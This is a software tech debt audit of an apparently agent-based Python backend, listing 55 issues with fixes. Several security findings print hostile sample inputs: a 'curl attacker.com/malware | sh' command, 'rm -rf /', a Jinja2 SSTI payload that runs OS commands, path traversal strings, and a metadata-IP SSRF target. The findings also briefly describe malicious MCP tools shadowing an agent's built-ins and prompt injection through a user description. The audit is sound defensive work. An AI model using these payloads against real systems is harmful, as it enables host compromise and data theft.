# Tech Debt Audit — Sprints 12–14b

**Audited**: Sprints 12 through 14b (Plugins I/II, Skills, Soul Editor, Notifications, Budget, Audit Sinks, App Lock, Backup & Restore, Session Export)
**Test baseline at audit time**: 764 passing (73 unit + 691 integration), 0 failures
**Audit scope**: Backend source code, API routers, frontend wiring, security, concurrency, error handling, performance, type safety, observability
**Previous audits**: TD-01 through TD-137 (Sprints 01–11, all resolved)

---

## Resolution Status (Updated March 17, 2026)

**49 of 55 issues resolved. 2 partially resolved. 4 deferred.**

All code changes validated with 935 unit tests passing + 230+ integration tests passing.
See [tech_debt_cleanup_report.md](tech_debt_cleanup_report.md) for full details.

| Status | Count | IDs |
|--------|-------|-----|
| ✅ Resolved | 49 | TD-138–149, TD-151–156, TD-158–187, TD-189 |
| 🔶 Partial | 2 | TD-150 (IP literal check added; DNS-based SSRF not implemented), TD-157 (path check added; `filter` param needs Python ≥3.11.4) |
| ⬜ Deferred | 4 | TD-188 (total count across endpoints), TD-190 (import may be used in retention), TD-191 (feature stub), TD-192 (feature stub) |

---

## Executive Summary

**55 issues** identified across 5 sprint increments. The most urgent cluster is **security** — a Critical arbitrary command execution via MCP stdio transport, Jinja2 SSTI in the soul editor, arbitrary code execution through plugin loading and pip install, and path traversal in the audit file sink. These form an attack surface that, combined with the API's single-token auth model, could allow full host compromise.

The second cluster is **correctness bugs** — incompatible HookPoint literals that silently break all plugin hooks, a backup restore that replaces the database file while the connection is live, budget API queries that produce empty results by default, and a broken pagination `total` field.

The third cluster is **performance** — blocking synchronous I/O in async handlers (subprocess.run, shutil.copyfileobj), LIKE-based timestamp queries that prevent index usage on every LLM turn, per-event HTTP client creation in webhook sinks, and N+1 seed patterns at startup.

| Severity | Count | Description |
|----------|-------|-------------|
| **Critical** | 4 | RCE/SSTI/command injection, incompatible hook literals, DB corruption on restore |
| **High** | 8 | Path traversal, file handle leaks, broken budget queries, brute-force, blocking I/O, missing tool unregister |
| **Medium** | 18 | Race conditions, SSRF, missing validation, performance bottlenecks, API design gaps |
| **Low** | 25 | Code quality, dead code, type annotations, hardcoded values, minor inconsistencies |
| **Total** | **55** | |

---

## Quick Reference

| ID | Title | Sev | Sprint | Category | Status |
|----|-------|-----|--------|----------|--------|
| [TD-138](#td-138) | Arbitrary command execution via MCP stdio transport | **Crit** | S13 | Security | ✅ |
| [TD-139](#td-139) | Jinja2 SSTI in soul prompt renderer (unsandboxed Environment) | **Crit** | S14a | Security | ✅ |
| [TD-140](#td-140) | Incompatible `HookPoint` literals — plugin hooks never fire | **Crit** | S13 | Bug | ✅ |
| [TD-141](#td-141) | Backup restore replaces DB file while connection is live | **Crit** | S14b | Data Integrity | ✅ |
| [TD-142](#td-142) | Arbitrary code execution via custom plugin loading (no sandbox) | **High** | S12 | Security | ✅ |
| [TD-143](#td-143) | Arbitrary code execution via pip install of plugin dependencies | **High** | S12 | Security | ✅ |
| [TD-144](#td-144) | Path traversal in audit file sink — arbitrary filesystem writes | **High** | S14b | Security | ✅ |
| [TD-145](#td-145) | File handle leak in audit file sink (never closed) | **High** | S14b | Resource Leak | ✅ |
| [TD-146](#td-146) | `date_or_month=None` produces broken SQL in budget API | **High** | S14b | Bug | ✅ |
| [TD-147](#td-147) | No brute-force protection on PIN/recovery key verification | **High** | S14b | Security | ✅ |
| [TD-148](#td-148) | Blocking `subprocess.run()` in async plugin dependency install | **High** | S12 | Performance | ✅ |
| [TD-149](#td-149) | MCP tools never unregistered on deactivate — stale tools callable | **High** | S13 | Design | ✅ |
| [TD-150](#td-150) | SSRF via webhook audit sink — no URL validation | **Med** | S14b | Security | 🔶 |
| [TD-151](#td-151) | SSRF via MCP HTTP transport — no URL validation | **Med** | S13 | Security | ✅ |
| [TD-152](#td-152) | Unencrypted backup archives contain sensitive data | **Med** | S14b | Security | ✅ |
| [TD-153](#td-153) | User-controlled backup directory path — no validation | **Med** | S14b | Security | ✅ |
| [TD-154](#td-154) | MCP tool name collision — can shadow built-in tools | **Med** | S13 | Security | ✅ |
| [TD-155](#td-155) | ReDoS via user-defined skill trigger patterns | **Med** | S14a | Security | ✅ |
| [TD-156](#td-156) | Webhook secret stored as hash — HMAC validation broken | **Med** | S12 | Bug | ✅ |
| [TD-157](#td-157) | Backup tar extraction safety depends on Python version | **Med** | S14b | Security | 🔶 |
| [TD-158](#td-158) | `SoulEditor.save_version` race — duplicate version numbers | **Med** | S14a | Concurrency | ✅ |
| [TD-159](#td-159) | `SkillStore` writes use raw `commit()` instead of `write_transaction()` | **Med** | S14a | Concurrency | ✅ |
| [TD-160](#td-160) | `LIKE`-based timestamp queries prevent index usage in budget | **Med** | S14b | Performance | ✅ |
| [TD-161](#td-161) | Broken pagination `total` in `list_sessions` | **Med** | S12 | Bug | ✅ |
| [TD-162](#td-162) | `regenerate_response` / `edit_and_resubmit` error handling ineffective | **Med** | S12 | Bug | ✅ |
| [TD-163](#td-163) | Notification session injection targets wrong session | **Med** | S14b | Bug | ✅ |
| [TD-164](#td-164) | Backup restore reports "complete" even when migrations fail | **Med** | S14b | Bug | ✅ |
| [TD-165](#td-165) | Blocking `shutil.copyfileobj` in async backup restore endpoint | **Med** | S14b | Performance | ✅ |
| [TD-166](#td-166) | New `httpx.AsyncClient` created per webhook audit event | **Med** | S14b | Performance | ✅ |
| [TD-167](#td-167) | `route_event` queries all sinks from DB on every audit event | **Med** | S14b | Performance | ✅ |
| [TD-168](#td-168) | Tag filtering applied after `LIMIT`/`OFFSET` in skill listing | **Med** | S14a | API | ✅ |
| [TD-169](#td-169) | Health checks run sequentially across all plugins | **Med** | S12 | Performance | ✅ |
| [TD-170](#td-170) | N+1 queries in seed methods (skills, notifications, budget) | **Med** | S14a/b | Performance | ✅ |
| [TD-171](#td-171) | `sys.path` permanently mutated by plugin discovery | **Med** | S12 | Design | ✅ |
| [TD-172](#td-172) | Silent exception swallowing in notification dispatcher registration | **Med** | S14b | Observability | ✅ |
| [TD-173](#td-173) | `refresh_plugins` directly accesses private `_records` dict | **Low** | S12 | Design | ✅ |
| [TD-174](#td-174) | Weak PIN policy — only 4+ chars, no complexity requirements | **Low** | S14b | Security | ✅ |
| [TD-175](#td-175) | Recovery key returned in plain API response (no cache-control) | **Low** | S14b | Security | ✅ |
| [TD-176](#td-176) | Prompt injection in soul generation via user description | **Low** | S14a | Security | ✅ |
| [TD-177](#td-177) | Internal error details leaked in plugin API responses | **Low** | S12 | Security | ✅ |
| [TD-178](#td-178) | `BudgetTracker.set_cap` returns stale `id` | **Low** | S14b | Bug | ✅ |
| [TD-179](#td-179) | `budget.period` parameter unused in `get_by_agent`/`get_by_provider` | **Low** | S14b | Dead Code | ✅ |
| [TD-180](#td-180) | `_passthrough` notification type leaks to DB | **Low** | S14b | Design | ✅ |
| [TD-181](#td-181) | `Notification.mark_read()` returns True for nonexistent IDs | **Low** | S14b | Bug | ✅ |
| [TD-182](#td-182) | Unbounded 5000-message fetch in session export | **Low** | S14b | Performance | ✅ |
| [TD-183](#td-183) | No pagination on `GET /api/plugins` | **Low** | S12 | API | ✅ |
| [TD-184](#td-184) | Hardcoded MCP protocol version and client info | **Low** | S13 | Config | ✅ |
| [TD-185](#td-185) | `list_tools()` always returns `[]` (misleading public method) | **Low** | S12 | Design | ✅ |
| [TD-186](#td-186) | `_gateway` not initialized in `PluginRegistry.__init__` | **Low** | S12 | Design | ✅ |
| [TD-187](#td-187) | `NotificationOut.created_at` typed as `str` instead of `datetime` | **Low** | S14b | API | ✅ |
| [TD-188](#td-188) | Missing `total` count in paginated list responses (skills, notifications, usage) | **Low** | S14a/b | API | ⬜ |
| [TD-189](#td-189) | Duplicate `import asyncio` in plugin `start_watcher` | **Low** | S12 | Code Quality | ✅ |
| [TD-190](#td-190) | Unused import `query_audit_log` in `sinks.py` | **Low** | S14b | Dead Code | ⬜ |
| [TD-191](#td-191) | TODO: contradiction detection in extraction.py (stub) | **Low** | S10 | Deferred | ⬜ |
| [TD-192](#td-192) | TODO: telegram gateway session routing (stub) | **Low** | S12 | Deferred | ⬜ |

---

## Critical Severity

### TD-138

**Arbitrary command execution via MCP stdio transport**

- **File**: `app/plugins/mcp/client.py` lines 141–153
- **Sprint**: S13
- **Category**: Security

The MCP client spawns a subprocess from `url_or_command`, which is user-controlled via `PATCH /api/plugins/mcp` config. An attacker with API access can set `url_or_command` to any system command (e.g., `["rm", "-rf", "/"]` or `"curl attacker.com/malware | sh"`), enabling arbitrary code execution on the host.

```python
self._proc = await asyncio.create_subprocess_exec(
    *cmd,
    stdin=asyncio.subprocess.PIPE,
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.PIPE,
)
```

**Fix**: Allowlist permitted MCP commands/binaries. Validate `url_or_command` against a strict regex or maintained list of approved executables. Never pass raw user-supplied commands to subprocess.

---

### TD-139

**Jinja2 SSTI in soul prompt renderer (unsandboxed Environment)**

- **File**: `app/agent/soul.py` lines 84–106
- **Sprint**: S14a
- **Category**: Security

`render_soul_prompt()` uses a standard Jinja2 `Environment` (no sandbox) to render `soul.system_prompt_template`, which is user-editable via the soul editor API. A crafted template such as `{{ ''.__class__.__mro__[1].__subclasses__() }}` can enumerate classes, or `{{ cycler.__init__.__globals__.os.popen('id').read() }}` can execute arbitrary OS commands.

**Fix**: Replace `Environment(...)` with `SandboxedEnvironment(...)` from `jinja2.sandbox`. This restricts attribute access and blocks dangerous operations.

---

### TD-140

**Incompatible `HookPoint` literals — plugin hooks never fire**

- **File**: `app/plugins/models.py` lines 66–73 vs `app/plugins/hooks/models.py` lines 10–17
- **Sprint**: S13
- **Category**: Bug

Two separate `HookPoint` definitions exist with **entirely different** string values:

| Hook engine (`hooks/models.py`) | Plugin model (`plugins/models.py`) |
|---|---|
| `"pre_prompt"` | `"pre_prompt_assembly"` |
| `"post_prompt"` | `"post_prompt_assembly"` |
| `"pre_tool"` | `"pre_tool_execution"` |
| `"post_tool"` | `"post_tool_execution"` |
| `"pre_response"`, `"post_response"` | `"post_turn_complete"` |

Any plugin registering hooks via `plugins.models.PipelineHookSpec` uses values the `HookEngine` never matches → hooks silently never execute.

**Fix**: Unify `HookPoint` into a single canonical `Literal` definition imported by both modules.

---

### TD-141

**Backup restore replaces DB file while connection is live**

- **File**: `app/backup/__init__.py` lines 194–239
- **Sprint**: S14b
- **Category**: Data Integrity

`restore_backup` calls `_extract_archive` which writes `tequila.db` to `data_root`. The application's singleton `aiosqlite` connection still points to the old file descriptor. On Windows, extraction fails because the file is locked. On Linux, the old connection keeps stale data while the file on disk has new data.

**Fix**: Close the database connection before extraction, then reopen after. Or require a full application restart after restore (return a response instructing the frontend to trigger a restart).

---

## High Severity

### TD-142

**Arbitrary code execution via custom plugin loading (no sandbox)**

- **File**: `app/plugins/discovery.py` lines 87–102
- **Sprint**: S12
- **Category**: Security

`_load_plugin_class()` calls `spec.loader.exec_module(module)` on arbitrary `__plugin__.py` files found in the plugins directory. Any Python code is executed with full application privileges. No sandbox, code signing, or integrity verification.

**Fix**: Implement code-signing verification before loading. Restrict plugins directory permissions. Consider subprocess sandbox. Add manifest validation step.

---

### TD-143

**Arbitrary code execution via pip install of plugin dependencies**

- **File**: `app/plugins/api.py` lines 279–291
- **Sprint**: S12
- **Category**: Security

`POST /api/plugins/{id}/dependencies/install` calls `subprocess.run([sys.executable, "-m", "pip", "install", pkg_spec])`. Package specs come from plugin config — malicious packages execute arbitrary code during install via `setup.py`.

**Fix**: Maintain an allowlist of permitted packages. Validate against PyPI. Add confirmation/audit step. Consider `--require-hashes` mode.

---

### TD-144

**Path traversal in audit file sink — arbitrary filesystem writes**

- **File**: `app/audit/sinks.py` lines 275–278
- **Sprint**: S14b
- **Category**: Security

`_route_to_file()` writes to a path from `sink.config.get("path")`, which is user-supplied via `POST /api/audit/sinks`. An attacker can set `path` to `../../../../etc/cron.d/evil`. `path.parent.mkdir(parents=True, exist_ok=True)` creates intermediate directories.

**Fix**: Validate and resolve the path against an allowed base directory (e.g., `data/logs/`). Reject paths containing `..` or absolute paths. Use `Path.resolve()` and verify prefix.

---

### TD-145

**File handle leak in audit file sink (never closed)**

- **File**: `app/audit/sinks.py` line 280
- **Sprint**: S14b
- **Category**: Resource Leak

```python
await asyncio.to_thread(lambda: path.open("a", encoding="utf-8").write(line))
```

`path.open()` returns a file object that is never closed. Under high audit event volume, this exhausts OS file descriptor limits.

**Fix**: Use a proper function with `with` statement:
```python
def _append(p, data):
    with p.open("a", encoding="utf-8") as f:
        f.write(data)
await asyncio.to_thread(_append, path, line)
```

---

### TD-146

**`date_or_month=None` produces broken SQL in budget API**

- **File**: `app/api/routers/budget.py` lines 47–53 → `app/budget/__init__.py` line 354
- **Sprint**: S14b
- **Category**: Bug

The router declares `date_or_month: str | None = None` but passes it directly. The tracker method does `f"{date_or_month}%"` → produces `"None%"` which matches zero rows. Same issue on `get_by_agent` and `get_by_provider`.

**Fix**: Default to today in the router:
```python
if date_or_month is None:
    now = datetime.now(timezone.utc)
    date_or_month = now.date().isoformat() if period == "daily" else now.strftime("%Y-%m")
```

---

### TD-147

**No brute-force protection on PIN/recovery key verification**

- **File**: `app/auth/app_lock.py` lines 119–152 / `app/api/routers/app_lock.py` lines 74–84
- **Sprint**: S14b
- **Category**: Security

No rate limiting, account lockout, or exponential backoff. A 4-digit numeric PIN can be brute-forced in ~10,000 requests. bcrypt slows each attempt to ~250ms but doesn't prevent automation.

**Fix**: Add `failed_attempts` and `locked_until` columns to `app_lock`. After 5 consecutive failures, lock for 5 minutes (exponential). Return 429 Too Many Requests while locked.

---

### TD-148

**Blocking `subprocess.run()` in async plugin dependency install**

- **File**: `app/plugins/api.py` lines 259–267
- **Sprint**: S12
- **Category**: Performance

`install_dependencies` calls `subprocess.run()` (blocking, 120s timeout per package) inside an `async def` handler. For N packages, blocks the event loop for up to N×120 seconds. Server becomes completely unresponsive.

**Fix**: Use `asyncio.create_subprocess_exec()` or wrap in `asyncio.to_thread(subprocess.run, ...)`.

---

### TD-149

**MCP tools never unregistered on deactivate — stale tools callable**

- **File**: `app/plugins/mcp/plugin.py` lines 80–84 / `app/tools/registry.py`
- **Sprint**: S13
- **Category**: Design

On `deactivate()`, `self._registered_names = []` clears the local list, but tools **remain in the global `ToolRegistry`**. `ToolRegistry` has no `unregister()` method. Deactivated MCP tools remain callable by agents, causing `RuntimeError("MCP plugin not connected")`.

**Fix**: Add `unregister(name: str)` to `ToolRegistry`. Call from `MCPPlugin.deactivate()` for each registered tool name.

---

## Medium Severity

### TD-150

**SSRF via webhook audit sink — no URL validation**

- **File**: `app/audit/sinks.py` lines 283–292
- **Sprint**: S14b
- **Category**: Security

`_route_to_webhook()` sends POST requests to a user-supplied URL with no validation. An attacker can target `http://169.254.169.254/` for cloud metadata or internal services.

**Fix**: Block private/link-local IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16). Require HTTPS. Resolve DNS and validate resolved IP.

---

### TD-151

**SSRF via MCP HTTP transport — no URL validation**

- **File**: `app/plugins/mcp/client.py` lines 162–174
- **Sprint**: S13
- **Category**: Security

The MCP HTTP transport creates `httpx.AsyncClient` pointing at a user-supplied URL. Same SSRF risk as TD-150.

**Fix**: Apply the same URL validation/blocklist as TD-150. Restrict to HTTPS for remote servers.

---

### TD-152

**Unencrypted backup archives contain sensitive data**

- **File**: `app/backup/__init__.py` lines 137–141
- **Sprint**: S14b
- **Category**: Security

Backups contain the full SQLite database (encrypted credentials, PIN hashes, session data) and sensitive files (`data/vault/`). Archives are plain tar.gz with no encryption.

**Fix**: Encrypt archives with AES-256-GCM using a user-supplied or auto-generated key. Store the encryption key separately from the backup.

---

### TD-153

**User-controlled backup directory path — no validation**

- **File**: `app/api/routers/backup.py` lines 92–100 / `app/backup/__init__.py` lines 97–99
- **Sprint**: S14b
- **Category**: Security

`PATCH /api/backup/config` accepts `backup_dir` without validation. `Path(config.backup_dir).mkdir(parents=True, exist_ok=True)` creates directories at any writable filesystem location. Sensitive backup archives will then be written there.

**Fix**: Validate against an allowed base path. Reject absolute paths and paths containing `..`.

---

### TD-154

**MCP tool name collision — can shadow built-in tools**

- **File**: `app/plugins/mcp/plugin.py` lines 112–137
- **Sprint**: S13
- **Category**: Security

Tools from an MCP server are registered using names from the remote server response. A malicious MCP server can supply names that shadow built-in tools (e.g., `fs_read_file`, `memory_save`), redirecting agent tool calls through the attacker's proxy.

**Fix**: Prefix MCP tool names with a namespace (e.g., `mcp_<server>_<tool_name>`). Check for collisions and refuse to overwrite existing registrations.

---

### TD-155

**ReDoS via user-defined skill trigger patterns**

- **File**: `app/agent/skills.py` lines 869–878
- **Sprint**: S14a
- **Category**: Security

`SkillEngine.resolve_active_skills()` calls `re.search(pattern, user_message)` where `pattern` is user-defined. A malicious regex like `(a+)+$` causes catastrophic backtracking, freezing the event loop.

**Fix**: Use the `regex` library with `timeout` parameter, or validate patterns against a safe subset. Alternatively use `re2` for guaranteed linear-time matching.

---

### TD-156

**Webhook secret stored as hash — HMAC validation broken**

- **File**: `app/plugins/builtin/webhooks/plugin.py` lines 162–163
- **Sprint**: S12
- **Category**: Bug

`create_endpoint()` stores the secret as `hashlib.sha256(secret.encode()).hexdigest()`. But `validate_hmac_signature()` needs the **raw secret** to compute the HMAC. Since only the hash is stored, HMAC validation cannot retrieve the original secret.

**Fix**: Encrypt the webhook secret using `encrypt_credential()` (Fernet encryption) rather than hashing it. This allows retrieval for HMAC validation.

---

### TD-157

**Backup tar extraction safety depends on Python version**

- **File**: `app/backup/__init__.py` lines 248–256
- **Sprint**: S14b
- **Category**: Security

`_extract_archive()` uses `tar.extract(member, filter="tar")`. The `filter` parameter was added in Python 3.11.4/3.12. On older versions, this raises `TypeError`. The top-level name whitelist check (`parts[0]`) doesn't catch `uploads/../../etc/passwd`.

**Fix**: Add explicit path traversal check: after resolving, verify `resolved_path.is_relative_to(data_root)`. Add try/except for the `filter` parameter.

---

### TD-158

**`SoulEditor.save_version` race — duplicate version numbers**

- **File**: `app/agent/soul_editor.py` lines 81–103
- **Sprint**: S14a
- **Category**: Concurrency

`SELECT MAX(version_num)` followed by `INSERT` with `next_num = max + 1` — not wrapped in `write_transaction`. Two concurrent saves for the same agent can produce duplicate version numbers.

**Fix**: Wrap the entire read-then-write in `async with write_transaction(self._db):`.

---

### TD-159

**`SkillStore` writes use raw `commit()` instead of `write_transaction()`**

- **File**: `app/agent/skills.py` lines 568–584 (and 640, 654, 680, 706, 717, 795)
- **Sprint**: S14a
- **Category**: Concurrency

Every write method calls `await self._db.commit()` directly instead of using the serialized `write_transaction()` context manager. Skips the global write lock, risking `SQLITE_BUSY` errors under concurrent requests.

**Fix**: Replace `await self._db.commit()` patterns with `async with write_transaction(self._db):` blocks.

---

### TD-160

**`LIKE`-based timestamp queries prevent index usage in budget**

- **File**: `app/budget/__init__.py` lines 283–308, 352–394
- **Sprint**: S14b
- **Category**: Performance

All budget queries use `WHERE timestamp LIKE ?` with patterns like `"2024-01-15%"`. SQLite cannot use B-tree indexes with LIKE patterns on ISO timestamps. These queries run on **every LLM turn** (cap checking) — O(n) full table scan.

**Fix**: Use range queries: `WHERE timestamp >= ? AND timestamp < ?` with computed day/month boundaries. Add index on `turn_costs(timestamp)`.

---

### TD-161

**Broken pagination `total` in `list_sessions`**

- **File**: `app/api/routers/sessions.py` lines 127–131
- **Sprint**: S12
- **Category**: Bug

```python
return SessionListResponse(
    sessions=[_session_to_response(s) for s in sessions],
    total=len(sessions),  # This is page size, not DB total!
)
```

**Fix**: Add a `count()` method to `SessionStore` and call it before pagination.

---

### TD-162

**`regenerate_response` / `edit_and_resubmit` error handling ineffective**

- **File**: `app/api/routers/sessions.py` lines 309–322, 375–389
- **Sprint**: S12
- **Category**: Bug

Both endpoints wrap `asyncio.create_task()` in try/except. `create_task()` never raises from the coroutine — exceptions become fire-and-forget logs. Client always gets `202 Accepted` even when the operation immediately fails.

**Fix**: Perform validation (session/message existence) **before** `create_task`, or `await` the initial validation then fire-and-forget the rest.

---

### TD-163

**Notification session injection targets wrong session**

- **File**: `app/notifications/__init__.py` lines 404–419
- **Sprint**: S14b
- **Category**: Bug

`_inject_session` always injects into the most-recently-active webchat session, ignoring `notif.source_session_key`. Background agent notifications go to the wrong session.

**Fix**: Use `notif.source_session_key` when available; fall back to most-recent webchat only when `None`.

---

### TD-164

**Backup restore reports "complete" even when migrations fail**

- **File**: `app/backup/__init__.py` lines 215–231
- **Sprint**: S14b
- **Category**: Bug

If migration fails, `"migrations_applied"` is not appended but `"complete"` always is. The caller sees success even with a broken schema.

**Fix**: Only append `"complete"` if migrations succeeded. Add `"migration_failed"` status and return an error indicator.

---

### TD-165

**Blocking `shutil.copyfileobj` in async backup restore endpoint**

- **File**: `app/api/routers/backup.py` lines 56–60
- **Sprint**: S14b
- **Category**: Performance

`shutil.copyfileobj(file.file, tmp)` is synchronous inside an async handler. Large backups (100+ MB) block the event loop.

**Fix**: Use `await asyncio.to_thread(shutil.copyfileobj, file.file, tmp)`.

---

### TD-166

**New `httpx.AsyncClient` created per webhook audit event**

- **File**: `app/audit/sinks.py` lines 291–296
- **Sprint**: S14b
- **Category**: Performance

Every audit event establishes a new TCP connection + TLS handshake for webhook delivery.

**Fix**: Maintain a shared `httpx.AsyncClient` on `AuditSinkManager`. Close in shutdown hook.

---

### TD-167

**`route_event` queries all sinks from DB on every audit event**

- **File**: `app/audit/sinks.py` lines 261–265
- **Sprint**: S14b
- **Category**: Performance

`route_event()` calls `self.list_sinks()` (DB query) on every single event. Sinks change rarely.

**Fix**: Cache sink list in memory. Invalidate on `create_sink`/`update_sink`/`delete_sink`.

---

### TD-168

**Tag filtering applied after `LIMIT`/`OFFSET` in skill listing**

- **File**: `app/agent/skills.py` lines 627–629
- **Sprint**: S14a
- **Category**: API

```python
if tags:
    skills = [s for s in skills if any(t in s.tags for t in tags)]
```

Filtering in Python **after** SQL `LIMIT/OFFSET`. Client gets fewer items than requested, breaking pagination.

**Fix**: Move tag filtering into SQL (using `json_each()`) or fetch all matching rows before LIMIT.

---

### TD-169

**Health checks run sequentially across all plugins**

- **File**: `app/plugins/registry.py` lines 305–320
- **Sprint**: S12
- **Category**: Performance

`_run_health_checks()` awaits each plugin's `health_check()` serially. A slow plugin delays all checks.

**Fix**: Use `asyncio.gather(*checks, return_exceptions=True)` with a per-check timeout.

---

### TD-170

**N+1 queries in seed methods (skills, notifications, budget)**

- **Files**: `app/agent/skills.py` lines 795–838, `app/notifications/__init__.py` lines 215–228, `app/budget/__init__.py` lines 157–168
- **Sprint**: S14a/b
- **Category**: Performance

Each seed method opens a separate `write_transaction` per row (7 skills × (SELECT+INSERT), 10 prefs, 7 pricing entries).

**Fix**: Batch all inserts into a single `write_transaction` with `executemany()` or `INSERT OR IGNORE`.

---

### TD-171

**`sys.path` permanently mutated by plugin discovery**

- **File**: `app/plugins/discovery.py` lines 94–96
- **Sprint**: S12
- **Category**: Design

Every discovered plugin directory is permanently prepended to `sys.path`. Accumulates over time, can cause import namespace collisions.

**Fix**: Use `importlib` without `sys.path` mutation, or save/restore `sys.path` around the import.

---

### TD-172

**Silent exception swallowing in notification dispatcher registration**

- **File**: `app/notifications/__init__.py` lines 275–278
- **Sprint**: S14b
- **Category**: Observability

```python
try:
    self._router.on(event_type, self._handle_event)
except Exception:
    pass
```

Completely silent. If event subscription fails, notifications for that event type stop working with no indication.

**Fix**: At minimum `logger.debug("Could not subscribe to %s: %s", event_type, exc)`.

---

## Low Severity

### TD-173

**`refresh_plugins` directly accesses private `_records` dict**

- **File**: `app/plugins/api.py` line 121
- **Sprint**: S12
- **Category**: Design

```python
registry._records[rec.plugin_id] = rec  # noqa: SLF001
```

**Fix**: Add public `PluginRegistry.refresh_records()` method.

---

### TD-174

**Weak PIN policy — only 4+ chars, no complexity requirements**

- **File**: `app/auth/app_lock.py` lines 124–125
- **Sprint**: S14b
- **Category**: Security

`set_pin()` only enforces `len(pin) < 4`. No maximum length (bcrypt truncates at 72 bytes), no complexity requirements.

**Fix**: Enforce minimum 6 characters. Add maximum 72. Recommend alphanumeric PINs.

---

### TD-175

**Recovery key returned in plain API response (no cache-control)**

- **File**: `app/api/routers/app_lock.py` lines 55–60
- **Sprint**: S14b
- **Category**: Security

`POST /api/lock/pin` returns recovery key in plaintext JSON. Reverse proxies and browser extensions may log it.

**Fix**: Add `Cache-Control: no-store` header. Document that response must not be logged.

---

### TD-176

**Prompt injection in soul generation via user description**

- **File**: `app/agent/soul_editor.py` lines 169–191
- **Sprint**: S14a
- **Category**: Security

User-supplied `description` is interpolated directly into an LLM prompt via f-string. Could manipulate LLM output.

**Fix**: Sanitize description (remove instruction-like patterns). Validate LLM output against schema.

---

### TD-177

**Internal error details leaked in plugin API responses**

- **File**: `app/plugins/api.py` lines 258–266, 291
- **Sprint**: S12
- **Category**: Security

Several endpoints return `str(exc)` including internal paths, module names, and stack details.

**Fix**: Return generic error messages. Log full details server-side only.

---

### TD-178

**`BudgetTracker.set_cap` returns stale `id`**

- **File**: `app/budget/__init__.py` lines 226–240
- **Sprint**: S14b
- **Category**: Bug

A new `cap_id` is generated but the original `cap` object (with different `.id`) is returned unchanged.

**Fix**: Set `cap.id = cap_id` before insert, or re-read from DB.

---

### TD-179

**`budget.period` parameter unused in `get_by_agent`/`get_by_provider`**

- **File**: `app/budget/__init__.py` lines 376, 393
- **Sprint**: S14b
- **Category**: Dead Code

Both methods accept `period` but never use it.

**Fix**: Remove the parameter or use it to determine the default `date_or_month`.

---

### TD-180

**`_passthrough` notification type leaks to DB**

- **File**: `app/notifications/__init__.py` line 271
- **Sprint**: S14b
- **Category**: Design

Event map for `"notification.push"` maps to type `"_passthrough"`. This internal sentinel is persisted as a user-visible notification type.

**Fix**: Skip DB persistence for passthrough events, or extract the real type from event payload.

---

### TD-181

**`Notification.mark_read()` returns True for nonexistent IDs**

- **File**: `app/notifications/__init__.py` lines 189–193
- **Sprint**: S14b
- **Category**: Bug

UPDATE may affect zero rows and still returns `True`. Should verify row was actually updated.

**Fix**: Check `cursor.rowcount` and return 404 if not found.

---

### TD-182

**Unbounded 5000-message fetch in session export**

- **File**: `app/sessions/export.py` line 88
- **Sprint**: S14b
- **Category**: Performance

Both `export_markdown` and `export_json` fetch up to 5000 messages into memory. Can be multi-MB for active sessions.

**Fix**: Make limit configurable via `ExportOptions`. For very large sessions, stream or paginate.

---

### TD-183

**No pagination on `GET /api/plugins`**

- **File**: `app/plugins/api.py` lines 80–83
- **Sprint**: S12
- **Category**: API

Returns all plugins with no `limit`/`offset`. Inconsistent with other list endpoints.

---

### TD-184

**Hardcoded MCP protocol version and client info**

- **File**: `app/plugins/mcp/client.py` lines 225–227
- **Sprint**: S13
- **Category**: Config

`"protocolVersion": "2024-11-05"` and `"version": "1.0.0"` are hardcoded.

**Fix**: Source from `app.constants.APP_VERSION`.

---

### TD-185

**`list_tools()` always returns `[]` (misleading public method)**

- **File**: `app/plugins/registry.py` line 265
- **Sprint**: S12
- **Category**: Design

A public method that always returns empty is misleading.

**Fix**: Remove or raise `NotImplementedError` with docstring pointing to `get_all_active_tools()`.

---

### TD-186

**`_gateway` not initialized in `PluginRegistry.__init__`**

- **File**: `app/plugins/registry.py` lines 87–93 vs 107
- **Sprint**: S12
- **Category**: Design

`self._gateway` is only set in `start()`, accessed via `getattr(self, "_gateway", None)` elsewhere.

**Fix**: Initialize `self._gateway = None` in `__init__`.

---

### TD-187

**`NotificationOut.created_at` typed as `str` instead of `datetime`**

- **File**: `app/api/routers/notifications.py` line 39
- **Sprint**: S14b
- **Category**: API

Inconsistent with other endpoints that use `datetime` in response models.

---

### TD-188

**Missing `total` count in paginated list responses (skills, notifications, usage)**

- **Files**: `app/api/routers/skills.py`, `notifications.py`, `budget.py`
- **Sprint**: S14a/b
- **Category**: API

List endpoints return arrays without `{items: [...], total: N}` envelope. Frontend can't render proper pagination UI.

---

### TD-189

**Duplicate `import asyncio` in plugin `start_watcher`**

- **File**: `app/plugins/discovery.py` lines 152, 168
- **Sprint**: S12
- **Category**: Code Quality

---

### TD-190

**Unused import `query_audit_log` in `sinks.py`**

- **File**: `app/audit/sinks.py` line 228
- **Sprint**: S14b
- **Category**: Dead Code

---

### TD-191

**TODO: contradiction detection in extraction.py (stub)**

- **File**: `app/memory/extraction.py` line 378
- **Sprint**: S10
- **Category**: Deferred Feature

`TODO: Implement actual contradiction detection using embedding similarity`

---

### TD-192

**TODO: telegram gateway session routing (stub)**

- **File**: `app/plugins/builtin/telegram/plugin.py` line 187
- **Sprint**: S12
- **Category**: Deferred Feature

`TODO: forward to gateway session routing in a future sprint`

---

## Code Quality Patterns

In addition to the above issues, the audit identified systemic patterns that contribute to technical debt:

### Broad exception catches (30 occurrences)

30 `noqa: BLE001` suppressions across the codebase — plugins (`registry.py`, `api.py`, `mcp/client.py`), memory (`lifecycle.py`, `entity_store.py`), knowledge (`embeddings.py`, `graph.py`), workflows (`api.py`), and tools (`executor.py`). Each catches `Exception` broadly.

7 instances are bare `except Exception: pass` with no logging whatsoever:
- `app/api/routers/graph.py` lines 133, 156
- `app/memory/recall.py` line 358
- `app/notifications/__init__.py` line 299
- `app/budget/__init__.py` line 135
- `app/api/routers/system.py` lines 209, 216

### Global singleton pattern (22 occurrences)

22 `noqa: PLW0603` suppressions for `global` statements across stores, registries, and engines. While consistent, the pattern makes testing harder and creates hidden state coupling.

### Type safety suppressions (26 non-import `type: ignore`)

26 non-import `# type: ignore` annotations suppress `arg-type`, `valid-type`, `call-arg`, `union-attr`, `override`, and `return` errors that may mask real bugs. Most concerning:
- `app/budget/__init__.py:336` — `type: ignore[arg-type]` on `_get_cap(period)`
- `app/api/routers/notifications.py:126` — `type: ignore[arg-type]` on channel types
